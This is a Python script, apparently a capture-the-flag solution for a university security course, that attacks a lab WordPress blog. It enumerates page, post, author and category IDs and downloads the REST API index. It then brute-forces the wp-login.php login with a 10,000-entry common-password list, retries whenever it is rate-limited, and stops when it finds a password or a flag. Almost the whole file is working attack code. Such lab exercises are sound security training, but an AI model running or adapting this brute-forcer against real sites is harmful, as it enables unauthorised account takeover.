import requests
import re
import json

session = requests.Session()
session.cert = "../../z5437741.pem"

BASE_URL = "https://blog.quoccacorp.com"
WORDPRESS_REST_API_INDEX_URL = "https://blog.quoccacorp.com/index.php?rest_route=/"
WORDPRESS_REST_API_INDEX_FILENAME = "blog3_WP_REST_API_Index.json"
COMMON_PASSWORDS_URL = "https://github.com/danielmiessler/SecLists/raw/refs/heads/master/Passwords/Common-Credentials/10k-most-common.txt"
INCORRECT_PAGE_MSG = "<p>Sorry, but nothing was found. Please try a search with different keywords.</p>"
WP_LOGIN_URL = "https://blog.quoccacorp.com/wp-login.php"
USERNAME = "Ihaveabadpassword"
INCORRECT_PASSWORD_MSG = f"The password you entered for the username <strong>{USERNAME}</strong> is incorrect."
PAGE_NOT_FOUND_CONTENT = """<head>
	<meta charset="UTF-8" />
	<meta name="viewport" content="width=device-width, initial-scale=1" />
<meta name='robots' content='max-image-preview:large' />
	<style>img:is([sizes="auto" i], [sizes^="auto," i]) { contain-intrinsic-size: 3000px 1500px }</style>
	<title>Page not found &#8211; Quoccacorp Blog</title>
<link rel="alternate" type="application/rss+xml" title="Quoccacorp Blog &raquo; Feed" href="https://blog.quoccacorp.com/?feed=rss2" />
<link rel="alternate" type="application/rss+xml" title="Quoccacorp Blog &raquo; Comments Feed" href="https://blog.quoccacorp.com/?feed=comments-rss2" />"""
QUERY_PARAMETERS = ["p", "page_id", "author", "cat"]
FLAG_PATTERN = r"(COMP6443{.+?})"

def find_flag(text: str):
    if flag_match := re.search(FLAG_PATTERN, text):
        print(text)
        flag = flag_match.group(1)
        print(f"\n🚩 FLAG FOUND 🚩\n{flag}" * 10)
        exit()

def get_wordpress_rest_api_index():
    response = session.get(WORDPRESS_REST_API_INDEX_URL)
    response_text = response.content.decode("utf-8", "ignore")
    response_text_json = json.loads(response_text)
    with open(WORDPRESS_REST_API_INDEX_FILENAME, "w") as f:
        f.write(json.dumps(response_text_json, indent=2))

def get_common_passwords() -> list[str]:
    return session.get(COMMON_PASSWORDS_URL).content.decode("utf-8", "ignore").splitlines()

def find_pages(query_parameter: str):
    for i in range(500):
        url = f"{BASE_URL}?{query_parameter}={i}"
        response = session.get(url)
        response_text = response.content.decode("utf-8", "ignore")

        if PAGE_NOT_FOUND_CONTENT not in response_text and response.status_code != 429:
            print(f"❗️ {url = } exists")

def main():
    # urls_to_retry = []
    # for common_password in get_common_passwords():
    #     if urls_to_retry:
    #         url = urls_to_retry.pop()
    #         print(f"🔄 Retrying {url = }")
    #     else:
    #         url = BASE_URL + f"?author=2&password={common_password}"
    #         print(f"🔗 Visiting {url = }")

    #     response = session.get(url)
    #     response_text = response.content.decode("utf-8", "ignore")
    #     find_flag(response_text)

    #     if response.status_code == 429:
    #         urls_to_retry.append(url)

    passwords = get_common_passwords()
    passwords.reverse()
    while passwords:
        password = passwords.pop()
        print(f"🔐 Trying {password = }")

        response = session.post(WP_LOGIN_URL, data={"log": USERNAME, "pwd": password, "rememberme": "forever"})
        response_text = response.content.decode("utf-8", "ignore")
        find_flag(response_text)

        if INCORRECT_PASSWORD_MSG not in response_text and response.status_code != 429:
            print(f"🔓 PASSWORD FOUND: {password}")
            break

        if response.status_code == 429:
            passwords.append(password)

if __name__ == "__main__":
    main()